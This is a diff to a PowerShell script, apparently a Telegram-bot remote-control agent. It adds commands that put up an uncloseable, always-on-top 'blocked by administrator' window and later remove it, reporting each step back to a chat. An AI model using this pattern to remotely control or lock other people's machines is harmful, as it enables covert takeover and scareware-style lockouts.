@@ -119,6 +119,63 @@ while ($true) {
                             $wsh.SendKeys("{SHIFT}")
                             [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Pantalla encendida en ID " + $MiIDNum })
                         }
+                        "/bloquear_pantalla" {
+    # 1. Capturar el texto opcional que quieras que diga el cartel grande
+    # Ejemplo de uso: /bloquear_pantalla 1 Mantenimiento en curso. Por favor espere.
+    $TextoCartel = if ($Partes.Count -gt 2) { ($Partes[2..($Partes.Count-1)] -join " ") } else { "EQUIPO BLOQUEADO POR EL ADMINISTRADOR" }
+    
+    # 2. Si ya hay un bloqueo activo, lo cerramos antes para no duplicar procesos
+    if ($global:FormBloqueo) { try { $global:FormBloqueo.Close() } catch {} }
+
+    # 3. Crear la ventana flotante en segundo plano utilizando hilos (Threads) para no congelar el bucle de Telegram
+    $ScriptBloqueo = [scriptblock]{
+        param($Mensaje)
+        Add-Type -AssemblyName System.Windows.Forms
+        Add-Type -AssemblyName System.Drawing
+
+        # Crear el formulario contenedor
+        $global:FormBloqueo = New-Object System.Windows.Forms.Form
+        $global:FormBloqueo.Text = "Alerta del Sistema"
+        $global:FormBloqueo.Size = New-Object System.Drawing.Size(600, 300)
+        $global:FormBloqueo.StartPosition = "CenterScreen"
+        $global:FormBloqueo.FormBorderStyle = "FixedDialog"
+        
+        # BLINDAJE: Quita los botones de cerrar (X), minimizar y maximizar
+        $global:FormBloqueo.ControlBox = $false
+        # BLINDAJE: Fuerza a la ventana a estar siempre al frente de todo
+        $global:FormBloqueo.TopMost = $true
+
+        # Crear la etiqueta de texto grande adentro
+        $Label = New-Object System.Windows.Forms.Label
+        $Label.Text = $Mensaje
+        $Label.Size = New-Object System.Drawing.Size(550, 200)
+        $Label.Location = New-Object System.Drawing.Point(25, 40)
+        $Label.Font = New-Object System.Drawing.Font("Arial", 16, [System.Drawing.FontStyle]::Bold)
+        $Label.TextAlign = "MiddleCenter"
+        $Label.ForeColor = [System.Drawing.Color]::Red
+
+        $global:FormBloqueo.Controls.Add($Label)
+        
+        # Mostrar la ventana y congelar el entorno visual
+        $global:FormBloqueo.ShowDialog() | Out-Null
+    }
+
+    # Ejecutar la ventana de forma asíncrona para que la PC siga escuchando órdenes de internet
+    $Null = Start-Job -ScriptBlock $ScriptBloqueo -ArgumentList $TextoCartel
+    [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Pantalla bloqueada con cartel fijo en ID " + $MiIDNum })
+}
+
+"/desbloquear_pantalla" {
+    # Busca el proceso del cartel en segundo plano y lo finaliza por completo
+    Stop-Job * -ErrorAction SilentlyContinue
+    Get-Process -Name "powershell" -ErrorAction SilentlyContinue | ForEach-Object {
+        # Cerramos las ventanas secundarias creadas por los Jobs
+        if ($_.MainWindowTitle -eq "Alerta del Sistema") { Stop-Process -Id $_.Id -Force }
+    }
+    [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Cartel removido. Pantalla liberada en ID " + $MiIDNum })
+}
+
+                        
                         "/notepad" {
                             notepad.exe
                             Start-Sleep -Milliseconds 500
